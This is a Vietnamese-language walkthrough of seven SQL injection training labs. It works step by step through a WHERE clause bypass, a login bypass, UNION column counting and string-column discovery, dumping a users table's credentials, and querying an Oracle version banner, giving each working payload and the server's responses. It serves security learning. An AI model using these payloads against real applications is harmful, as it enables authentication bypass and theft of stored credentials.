## LAB 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

__Lỗ hổng SQL injection trong mệnh đề WHERE cho phép truy xuất dữ liệu ẩn__

![2025-11-05-17-09-37](../images/2025-11-05-17-09-37.png)
---
 
Truy vấn có dạng:

```sql
SELECT * FROM products WHERE category = 'gift` AND release=1;
```
 
---
![2025-11-05-17-27-59](../images/2025-11-05-17-27-59.png)
---
 
Truy cập vào request có tham số `category`, có tham số về thể loại\n
Truy vấn có dạng:
```sql
SELECT * FROM products WHERE category = 'input' AND release=1;
```
 
---
![2025-11-05-17-20-53](../images/2025-11-05-17-20-53.png)
---
 
--> Sửa tham số `category` thành: `gift' OR '1'='1-- -`

--> Truy vấn trở thành:
```sql
SELECT * FROM products WHERE category = 'gift' OR '1'='1-- -' AND release=1;
```

--> Phần của tham số `release` sẽ bị bỏ qua do dấu `-- -` (comment trong SQL)

--> Web sẽ trả về tất cả các sản phẩm, bao gồm cả những sản phẩm chưa được phát hành (release=0)

---
![2025-11-05-17-21-16](../images/2025-11-05-17-21-16.png)


## LAB 2: SQL injection vulnerability allowing login bypass

__Lỗ hổng SQL injection cho phép vượt qua xác thực đăng nhập__

![2025-11-05-20-40-07](../images/2025-11-05-20-40-07.png)
---
 
Lab yêu cầu khai thác lỗ hổng `SQL injection` trong biểu mẫu đăng nhập để đăng nhập thành công vào tài khoản `administrator`, qua đó vượt qua cơ chế xác thực của ứng dụng.
 
---
![2025-11-05-20-56-15](../images/2025-11-05-20-56-15.png)
![2025-11-05-20-56-41](../images/2025-11-05-20-56-41.png)
![2025-11-05-20-58-11](../images/2025-11-05-20-58-11.png)
![2025-11-05-20-59-14](../images/2025-11-05-20-59-14.png)

# LAB 3: SQL injection UNION attack, determining the number of columns returned by the query

__Tấn công SQL injection UNION, xác định số cột được truy vấn trả về__

![2025-11-05-21-18-03](../images/2025-11-05-21-18-03.png)
---
 
Lab hướng dẫn khai thác `SQL injection UNION attack` trên bộ lọc danh mục sản phẩm. Mục tiêu là xác định số lượng cột mà truy vấn gốc trả về, bằng cách thực hiện một truy vấn `UNION` bổ sung một hàng chứa các giá trị `NULL`. Khi biết chính xác số cột, có thể tận dụng kỹ thuật này cho các bước khai thác tiếp theo để trích dữ liệu từ bảng khác.
 
---
![2025-11-05-21-20-20](../images/2025-11-05-21-20-20.png)
---
 
Burp Repeater đang gửi lại yêu cầu gốc `GET /filter?category=Accessories`, giữ nguyên tham số danh mục để làm mốc so sánh trước khi thử payload.
 
---
![2025-11-05-21-27-16](../images/2025-11-05-21-27-16.png)
---
 
Chèn dấu ' vào cuối tham số `category`, phản hồi trả `500 Internal Server Error`, cho thấy truy vấn SQL phía máy chủ bị phá vỡ cú pháp.
 
---
![2025-11-05-21-28-15](../images/2025-11-05-21-28-15.png)
---
 
Payload `Accessories'--+` sử dụng comment để bỏ phần còn lại của truy vấn;\Ứng dụng phản hồi `200 OK`, xác nhận có thể đóng comment để ổn định truy vấn sau khi chèn
 
---
![2025-11-05-21-29-18](../images/2025-11-05-21-29-18.png)
---
 
Payload `Accessories'+ORDER+BY+3--+` vẫn trả trang bình thường\-->Chứng tỏ truy vấn gốc có tối thiểu 3 cột\Đây là bước đếm cột bằng `ORDER BY`
 
---
![2025-11-05-21-29-48](../images/2025-11-05-21-29-48.png)
---
 
Khi tăng lên `ORDER BY 4`, phản hồi lại lỗi nội bộ, nghĩa là truy vấn gốc chỉ có `3` cột và giá trị `4` làm vượt quá số cột hợp lệ.
 
---
![2025-11-05-21-32-01](../images/2025-11-05-21-32-01.png)
---
 
`Accessories'+UNION+SELECT+NULL,+NULL,+NULL-- -`\
Trả trang bình thường, xác nhận `UNION` với `3` cột `NULL` phù hợp với truy vấn gốc
 
---
![2025-11-05-21-32-18](../images/2025-11-05-21-32-18.png)
---
 
Trang kết quả hiển thị thông báo __“Congratulations, you solved the lab!”__ \
Xác nhận việc xác định số cột bằng kỹ thuật `UNION` đã hoàn thành.
 
---

## LAB 4: SQL injection UNION attack, finding a column containing text

__Tấn công SQL injection UNION, tìm cột chứa dữ liệu dạng văn bản__

![2025-11-05-21-47-07](../images/2025-11-05-21-47-07.png)
---
 
Màn hình lab nêu mục tiêu phải chèn giá trị ngẫu nhiên do bài cho vào kết quả truy vấn bằng `SQL injection UNION`\Nghĩa là cần tìm cột chấp nhận dữ liệu dạng chuỗi.
 
---
![2025-11-05-21-49-30](../images/2025-11-05-21-49-30.png)
---
 
Request gốc `GET /filter?category=Gifts` phản hồi `200 OK`\Xác nhận baseline hoạt động trước khi thử payload.
 
---
![2025-11-05-21-49-58](../images/2025-11-05-21-49-58.png)
---
 
Thêm dấu `'` vào tham số `(category=Gifts')` dẫn tới `500 Internal Server Error`\-->Chứng minh đầu vào chưa được escape và có thể `SQLi`
 
---
![2025-11-05-21-50-18](../images/2025-11-05-21-50-18.png)
---
 
`Payload Gifts'--` dùng comment để “vá” lại truy vấn\-->Phản hồi `200 OK`, chuẩn bị cho bước đếm cột.
 
---
![2025-11-05-21-52-02](../images/2025-11-05-21-52-02.png)
---
 
Dùng Intruder thử `ORDER BY $N` với `N` từ 1 tới 5\
 
---
![2025-11-05-21-51-28](../images/2025-11-05-21-51-28.png)
---
 
-->Kết quả: `ORDER BY 1..3` trả `200`, còn `ORDER BY 4 và 5` trả `500`\-->Suy ra truy vấn gốc có đúng `3`cột.
 
---
![2025-11-05-21-59-31](../images/2025-11-05-21-59-31.png)
---
 
 Thử cặp payload UNION SELECT với chuỗi bọc trong dấu `"` (ví dụ `"a", NULL, NULL`)
 
---
![2025-11-05-21-58-49](../images/2025-11-05-21-58-49.png)
---

Nhưng mọi request bị lỗi (status 0/không phản hồi), cho thấy DB không chấp nhận kiểu chuỗi với double quote.
 
---
![2025-11-05-22-00-49](../images/2025-11-05-22-00-49.png)
---
 
Chuyển sang dùng dấu `'` (ví dụ `'a', NULL, NULL`).
 
---
![2025-11-05-22-01-37](../images/2025-11-05-22-01-37.png)
---
 
Kết quả Intruder cho thấy chỉ payload `NULL, 'a', NULL` nhận `200`, nghĩa là cột thứ 2 hỗ trợ dữ liệu dạng văn bản
 
---
![2025-11-05-22-03-53](../images/2025-11-05-22-03-53.png)
---
 
Thay chuỗi thử nghiệm bằng giá trị ngẫu nhiên bài yêu cầu (ví dụ `oJq3rt`) trong payload `Gifts' UNION SELECT NULL, 'oJq3rt', NULL-- -`, và chuỗi này xuất hiện trong kết quả
 
---
![2025-11-05-22-04-09](../images/2025-11-05-22-04-09.png)
---

Trang thông báo __“Congratulations, you solved the lab!”__, hoàn tất mục tiêu đưa giá trị bài cho vào kết quả truy vấn.
 
---

## LAB 5: SQL injection UNION attack to retrieve data from other tables

__Tấn công SQL injection UNION để truy xuất dữ liệu từ các bảng khác__

![2025-11-06-20-31-06](../images/2025-11-06-20-31-06.png)
---
 
Lab giới thiệu mục tiêu:\
Dùng `SQL injection UNION` để đọc bảng `users` (`username`, `password`) rồi đăng nhập tài khoản `administrator`.
 
---
![2025-11-06-20-32-49](../images/2025-11-06-20-32-49.png)
---
 
Request gốc `GET /filter?category=Corporate+gifts` trả `200 OK`\
Làm đường baseline trước khi thử payload.
 
---
![2025-11-06-20-33-29](../images/2025-11-06-20-33-29.png)
---

Thêm dấu `'` vào tham số gây `500 Internal Server Error`, xác nhận điểm tiêm và lỗi cú pháp SQL.

---
![2025-11-06-20-33-54](../images/2025-11-06-20-33-54.png)
---

Payload `Corporate+gifts'-- -` dùng comment để khôi phục truy vấn, phản hồi `200`, sẵn sàng bước đếm cột

---
![2025-11-06-20-34-25](../images/2025-11-06-20-34-25.png)
---

Không dùng được `ORDER BY` 

---
![2025-11-06-20-37-58](../images/2025-11-06-20-37-58.png)
---
 
Thử UNION SELECT NULL thất bại (500), nhắc cần khớp đúng số cột
 
---
![2025-11-06-20-40-50](../images/2025-11-06-20-40-50.png)
---

Intruder chạy danh sách `NULL, NULL,NULL, NULL,NULL,NULL…`;\
Chỉ payload `NULL,NULL` trả `200`, khẳng định truy vấn gốc có 2 cột

---
![2025-11-06-20-44-08](../images/2025-11-06-20-44-08.png)
---
 
Dùng `UNION SELECT username, password FROM users--` hiển thị cặp tài khoản đầu tiên `wiener / jh7uflgimyxh4uts7jv9`, chứng tỏ có thể đọc bảng `users`
 
---
![2025-11-06-20-50-07](../images/2025-11-06-20-50-07.png)
Thêm điều kiện `WHERE username='administrator'` để lọc đúng tài khoản quản trị; phản hồi chứa `administrator / vo0asiqrq5762wjeeixq`
![2025-11-06-20-50-45](../images/2025-11-06-20-50-45.png)

---

Sau khi dùng thông tin trên để đăng nhập, trang “My Account” xác nhận đăng nhập thành công với username `administrator`, đồng thời lab được đánh dấu solved.

---
## LAB 6: SQL injection UNION attack, retrieving multiple values in a single column

__Tấn công SQL injection UNION, truy xuất nhiều giá trị trong một cột__

![2025-11-06-20-56-12](../images/2025-11-06-20-56-12.png)
---
 
Request gốc `GET /filter?category=Pets` trả `200 OK`, đặt baseline cho lab “retrieving multiple values in a single column”.
 
---
![2025-11-06-20-56-28](../images/2025-11-06-20-56-28.png)
---
 
Chỉ thêm dấu `'` khiến phản hồi `500`, xác nhận có lỗ hổng `SQLi`.
 
---
![2025-11-06-20-56-45](../images/2025-11-06-20-56-45.png)
---
 
Dùng payload `Pets'--` để comment phần còn lại của truy vấn và khôi phục phản hồi `200`
 
---
![2025-11-06-20-59-54](../images/2025-11-06-20-59-54.png)
---
 
Thử `UNION SELECT NULL--` gây lỗi `500`, cho thấy số cột không khớp và cần xác định chính xác.
 
---
![2025-11-06-21-00-41](../images/2025-11-06-21-00-41.png)
---

Intruder thử chuỗi `NULL, NULL,NULL, NULL,NULL,NULL…`; chỉ `NULL,NULL` trả `200`, chứng minh truy vấn gốc có `2` cột.

---
![2025-11-06-21-01-29](../images/2025-11-06-21-01-29.png)
---
 

 
---
![2025-11-06-21-01-47](../images/2025-11-06-21-01-47.png)

---

Test cột nào nhận chuỗi; payload `UNION SELECT 'a', NULL--` lỗi, trong khi `UNION SELECT NULL, 'a'--` trả `200`, nên cột thứ hai là kiểu chuỗi.

---
![2025-11-06-21-06-36](../images/2025-11-06-21-06-36.png)
---

Xây dựng payload `UNION SELECT NULL, username || '~~' || password FROM users WHERE username='administrator'--`. Phần `||` ghép username và password vào cùng cột, hiển thị `administrator~~xkzdcjb297erzm54`.
 
---
![2025-11-06-21-07-39](../images/2025-11-06-21-07-39.png)
---

Dùng thông tin vừa lấy để đăng nhập; trang “My Account” xác nhận tài khoản `administrator` và lab được đánh dấu solved.

---

## LAB 7: SQL injection attack, querying the database type and version on Oracle

__Tấn công SQL injection, truy vấn loại và phiên bản cơ sở dữ liệu trên Oracle__

![2025-11-06-21-20-55](../images/2025-11-06-21-20-55.png)

---
 
Lab yêu cầu dùng `SQL injection` trên `Oracle` để hiển thị chuỗi `version` của DB
 
---
![2025-11-06-21-23-42](../images/2025-11-06-21-23-42.png)

---
 
Request hợp lệ `category=Gifts` trả `200`, dùng làm baseline.
 
---
![2025-11-06-21-24-21](../images/2025-11-06-21-24-21.png)

---
 
Thêm dấu `'` → `500 Internal Server Error`, chứng tỏ có lỗ hổng `SQLi`.
 
---
![2025-11-06-21-24-44](../images/2025-11-06-21-24-44.png)

---

Comment payload `Gifts'--` khôi phục `200`, sẵn sàng thử `UNION`.

---
![2025-11-06-21-27-33](../images/2025-11-06-21-27-33.png)

---
 
`UNION SELECT NULL--` lỗi `500`; cần xác định số cột chính xác và cú pháp cho `Oracle`.
 
---
![2025-11-06-21-37-55](../images/2025-11-06-21-37-55.png)

---
 
Intruder với nhiều `NULL` vẫn `500`; chưa có payload nào thành công.
 
---
![2025-11-06-21-38-08](../images/2025-11-06-21-38-08.png)

---
 
Gợi ý của lab nhắc `Oracle` yêu cầu `SELECT ... FROM ...` (dùng bảng `dual`)
 
---
![2025-11-06-21-38-57](../images/2025-11-06-21-38-57.png)

---

Intruder mới với dạng `NULL, NULL FROM dual` cho thấy chỉ payload có 2 cột `NULL` trả `200`, xác nhận truy vấn gốc có 2 cột

---
![2025-11-06-21-44-19](../images/2025-11-06-21-44-19.png)

---
 
Thử `UNION SELECT 'a', NULL FROM dual--` trả `200`; tức cột đầu chấp nhận chuỗi, cột sau vẫn `NULL`.
 
---
![2025-11-06-21-50-31](../images/2025-11-06-21-50-31.png)

---

Payload `UNION SELECT (SELECT * FROM v$version), NULL FROM dual--` lỗi `500` vì subquery trả nhiều dòng/column

---
![2025-11-06-21-50-51](../images/2025-11-06-21-50-51.png)

---
 
Điều chỉnh thành `UNION SELECT (SELECT banner FROM v$version WHERE ROWNUM=1), NULL FROM dual--` để lấy dòng đầu tiên; trang hiển thị banner DB "Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production"
 
---
![2025-11-06-22-02-17](../images/2025-11-06-22-02-17.png)

---

Rút gọn payload cuối cùng `UNION select banner, NULL from v$version--`, vẫn trả `200`

---
![2025-11-06-22-03-10](../images/2025-11-06-22-03-10.png)

---
 
Giao diện người dùng hiển thị chuỗi phiên bản `Oracle` ngay trong danh sách sản phẩm, xác nhận khai thác thành công.
 
---
![2025-11-06-22-03-26](../images/2025-11-06-22-03-26.png)

---

Banner “Solved” xuất hiện, lab hoàn thành với payload `Tech gifts' UNION select banner, NULL from v$version--`

---